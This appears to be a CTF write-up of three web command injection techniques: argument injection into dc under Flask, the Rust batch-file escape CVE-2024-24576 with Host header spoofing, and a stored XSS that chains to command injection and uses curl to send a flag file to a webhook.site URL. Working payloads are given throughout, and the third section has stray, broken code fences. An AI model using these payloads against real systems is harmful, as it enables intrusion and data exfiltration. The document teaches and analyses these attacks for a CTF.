# System Command Injection via Web

### Technique 1 

> **Target's Backend :** Flask
>
> **Target's OS:** Linux
>
> **Originally extecuted system command :** `dc` (A calculator app)

#### Vulnerable Server Code:

```py
@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)
```

#### The vulnerability:

Though the command to be executed by `subprocess.run()` is supplied as **a list of strings** (instead of a single string) and the **absence of** `shell=True` might make the code look secure at the first glance, in reality we can still inject malicious arguments into the command being executed, which happens to be `dc` in this case.

Therefore, even if we cannot do stuff like `something; whoami;`, `something | whoami;`, `somethingtrue && whoami;` etc., we can still **inject valid malicious arguments to abuse the executable's intended functionality**.

We can **confirm the possibility of argument injection** by sending GET requests with query strings `?sequence=-h` and `?sequence=-V` which will lead to the execution of the commands `dc -h.dc` and `dc -V.dc`respectively (the `.dc` at the end is added by the Flask code and is immaterial here for these options).

The obtained outputs are as follows:

```bash
# For GET request ?sequence=-h

Usage: dc [OPTION] [file ...]
  -e, --expression=EXPR    evaluate expression
  -f, --file=FILE          evaluate contents of file
  -h, --help               display this help and exit
  -V, --version            output version information and exit

# For GET request ?sequence=-V

dc (GNU bc 1.07.1) 1.4.1

#### The exploit:

By looking at the man page of `dc`, we can find that **`!` helps in arbitrary system command execution**.

So the ideal cmd to be run on the target would be `dc -e!whoami`; but the Flask code adds ".dc" at the end, which will run `dc -e!whoami.dc` causing an error. So we must supply a URL encoded newline character (`%0A`) in the query string to get the needed O/p.

The query string: `?sequence=-e!whoami%0A`

**Payload that bypasses `' '` and `'flag'` filters to get the flag's content** : `?sequence=-e!cat%5C$IFS*.txt%0A`

The aim is to run `dc -e!cat\$IFS*.txt` which uses `$IFS` *(`\` to escape `$`)* to introduce space after `cat` cmd and `*.txt` helps in locating all .txt files in the current directory to be used with the `cat` cmd.

### Technique 2:

> **Target's Backend :** Rust
>
> **Target's OS :** Windows
>
> Originally executed system command was a Batch file (`.bat`) with user controlled argument.

#### The vulnerable server code:

***main.rs***
```rust
#[handler]
pub fn route_admin_run(Query(run): Query<RunQuery>) -> String {
    let RunQuery { cmd, arg } = run;
    admin::run_cmd(cmd, arg.unwrap_or("".to_string()))
}

// .
// .
// Redacted 
// for brevity
// .
// .

async fn middleware_localhost<E: Endpoint>(next: E, req: Request) -> Result<Response> {
    if let Some(host) = req.uri().host().or(req.header("host")) {
        if !host.trim_start().starts_with("127.0.0.1") {
            return Err(Error::from_status(StatusCode::UNAUTHORIZED));
        }
    } else {
        return Err(Error::from_status(StatusCode::UNAUTHORIZED));
    }

    let resp = next.call(req).await?.into_response();
    Ok(resp)
}


// .
// .
// Redacted 
// for brevity
// .
// .


// Inside async fn main()

let app = Route::new()
        .at("/", StaticFileEndpoint::new("./static/index.html"))
        .nest("/assets", StaticFilesEndpoint::new("./static/assets/"))
        .at("/preview", post(route_preview).with(SizeLimit::new(4000)))
        .nest(
            "/ai", 
            Route::new()
                .at("/", StaticFileEndpoint::new("./static/admin.html"))
                .nest("/run", get(route_admin_run)) 
                .around(middleware_localhost),
        )
        .around(middleware_csp)
// .
// .
// Redacted 
// for brevity 
// .
// .

```

From the above code, the most important inferences that can be made are:

- There is an endpoint called `/ai/run` that accepts GET requests.
- A middleware is employed that requires the `Host` header of the request to have a value of `127.0.0.1` ("intends" to restrict the service just to localhost requests).
- The `route_admin_run` handler function extracts the values of *cmd* and *arg* from the query string of the request. Then it calls the function `run_cmd` from the module "admin" and passes *cmd* and *arg* as arguments.

***admin.rs***

```rust
// .
// .
// Redacted 
// for brevity 
// .
// .
pub fn run_cmd(cmd: String, arg: String) -> String {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return "".to_string();
    }
    let res = handle_cmd(&cmd, &arg);
    match res {
        Ok(s) => s,
        Err(msg) => format!("{}", msg),
    }
}

fn handle_cmd(cmd: &str, arg: &str) -> Result<String, String> {
    eprintln!("cmd: {};  arg: {}", cmd.escape_default(), arg);
    match cmd {
        "ping" => Ok("pong".to_string()),
        "time" => { 
            let datetime: DateTime<Utc> = SystemTime::now().into();
            Ok(format!("{}", datetime.format("%T:%m-%Y-%d"))) 
        }
        "env" => {
            if arg.trim().is_empty() {
                Ok(env::vars().map(|(k, v)| format!("{k}: {v}")).join("\n"))
            } else {
                if let Ok(val) = env::var(arg) {
                    Ok(format!("{arg}: {val}"))
                } else {
                    Ok(format!("Error: no env var named '{arg}'."))
                }
            }
        }
        
// .
// .
// Redacted 
// for brevity 
// .
// .
        "ping2" => {
            if arg.contains(['\'', '"', '*', '!', '@', '^', '?']) {
                return Err("bad chars found".to_string());
            }
            let routput = Command::new(".\\scripts\\ping.bat")
                .arg(arg)
                .output();
            if let Err(_e) = routput {
                return Err("failed to run ping2 output".to_string());
            }
            Ok(String::from_utf8_lossy(&routput.unwrap().stdout).to_string())
        }
        _ => panic!("unknown cmd: {}", cmd),
    }
}
```
From the above code, the most important inferences that can be made are:

- `run_cmd` after performing some basic tasks calls `handle_cmd`.
- The most interesting part of `handle_cmd` is the "ping2" block that filters for a few bad characters and runs a batch file called `ping.bat` with `arg` supplied as an argument. The batch file in turn executes the `ping` command and a bunch of other commands.


#### The vulnerability

- The Host header's value can be easily spoofed to *127.0.0.1* using tools like **Burp Suite's Repeater**. Ensure the Target's value (present on the top right part of the window) is correctly set to the actual target host.

- Using a **bad character list is not always a complete defence** as there might be characters that the developer might not be aware of and as a result is not checked for by the filter.

- Although the utilization of `std::process::Command` to run a system command with arguments passed with `.arg()` might seem to be secure (and it generally is), a major vulnerability arises when the application executed happens to be `cmd.exe` or `.bat` scripts. This issue is caused as these files use a non-standard way of decoding arguments and can lead to arbitrary command execution (See the *Warning* section in https://doc.rust-lang.org/std/process/struct.Command.html#implementations)

#### The exploit:

There is actually a CVE for the above discussed vulnerability : **CVE-2024-24576**

The most simple payload for this vulnerability would be `something" & whoami`. But this would not work as the bad character filter would flag the presence of `"` in our payload.

Another payload that would actually work in the current situation would be:

`GET /ai/run/?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type+flag.txt HTTP/1.1`

This aims to run the command `%CMDCMDLINE:~-1%&type flag.txt`.

> **Target's Backend :** Node.js and Flask (Two backends)
>
> **Target's OS :** Linux
>
> Originally executed system command was `cal` with an argument expected to be supplied by an authorized user with the appropriate secret cookie.

#### The vulnerable server code:

```

```js
const express = require("express");

#### Summary of the applications' functionality:

- Both the `Node.js` and `Flask` applications had been exposed to the Internet (most probably as docker containers) and were accessible on the ports 13336 and 13337 respectively of the CTF's challenge domain.

- The Flask app had 3 interesting routes:<br />
    
    1. `POST /api/stats` - Extracted a username and integer type high score from a `json` request body and added the values as an array to an object accessible with the key *'data'* along with a UUID accessible with the key *'id'* of the object. The object is then appended to a list and the UUID is returned in the HTTP response.
    
    2. `GET /api/stats/<string:id>`- The UUID was to be supplied in place of `<string:id>`, which was then used to identify the "stat", whose array (accessible via `stat['data']`) was to be sent in the HTTP response.

    3. `GET /api/cal` - Executed the shell command `cal` along with the string supplied via the query string param "modifier". The execution was carried out only if the correct secret cookie was sent.

 The Node.js app had one interesting route: `POST /visit`.
 The route basically constructed a URL by utilizing the *path* parameter from the request body and then checked for the presence of the strings "cal" and "%" in the constructed URL. If it didn't contain those strings, then the URL was visited with `puppeteer` along with a httpOnly secret cookie tied to the domain "127.0.0.1"; otherwise the error message *'Error: "cal" is not allowed in the URL'* was sent back to the user.

 #### The vulnerability and the exploit:

 The endpoints `POST /api/stats` and `GET /api/stats/<string:id>` facilitated XSS as an attacker could send the following XSS payload to the former endpoint which could be returned to execute in the browser upon accessing the latter endpoint:

 ```json
 { 
    "username":"<img src=x onerror=fetch('http[:]//127.0.0.1:1337/api/cal?modifier=2024%3b+curl+https[:]//webhook.site/766644c7-<REDACTED>549/?s=`cat+/ctf/flag.txt`')>", "high_score":10  
}
 ```  
**NOTE**: It is important to use `127.0.0.1:1337` instead of the Internet accessible challenge's domain and port 13337 in the XSS payload as the cookie is tied to the domain `127.0.0.1`.

The payload sends a GET request to `http[:]//127.0.0.1:1337/api/cal` with the *query string*: 

```
modifier=2024%3b+curl+https[:]//webhook.site/766644c7-<REDACTED>549/?s=`cat+/ctf/flag.txt`
```

The query string would be appended to the string "cal " and would be executed as a shell command. First, the nested shell command comprising of `cat` would be run, whose O/p would be placed as a part of a new query string in the GET request to an attacker controlled URL, essentially exfiltrating data.

The above payload when sent would return a UUID such as "ccaff3e5-c1ac-49e3-a1fa-df44ffcc720e". Next the path `api/stats/ccaff3e5-c1ac-49e3-a1fa-df44ffcc720e`  has to be submitted to the Admin Bot. The path will pass the filter as it doesn't have any bad strings in it and will be visited by `puppeteer`. Upon accessing the path on the Flask application, the contents returned in the HTTP response would include the above discussed stored XSS payload and would be executed. This would help in accessing the endpoint `/api/cal` and aid in exfiltarting the contents of the file `flag.txt`.
